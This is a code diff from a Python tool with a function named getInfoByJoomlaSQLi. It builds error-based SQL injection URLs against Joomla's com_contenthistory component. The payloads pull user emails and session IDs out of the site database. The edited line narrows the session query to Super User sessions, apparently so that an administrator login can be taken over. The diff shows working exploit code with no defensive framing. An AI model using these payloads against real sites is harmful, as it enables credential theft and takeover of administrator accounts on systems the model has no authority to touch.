@@ -370,7 +370,7 @@ def getInfoByJoomlaSQLi(url, param):
     elif 'email' in param:
         payload = "/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=(select 1 from (select count(*),concat((select (select concat(email)) from %23__users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
     elif 'session_id' in param:
-        payload = "/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=(select 1 from (select count(*),concat((select (select concat(session_id)) from %23__session limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
+        payload = "/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=(select 1 from (select count(*),concat((select (select concat(session_id)) FROM %23__session WHERE data LIKE '%Super User%' AND data NOT LIKE '%IS NOT NULL%' AND userid!='0' AND username IS NOT NULL LIMIT 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
     urlA=url+payload
     try:
 	result = requests.get(urlA,timeout=30,allow_redirects=True,verify=False).content
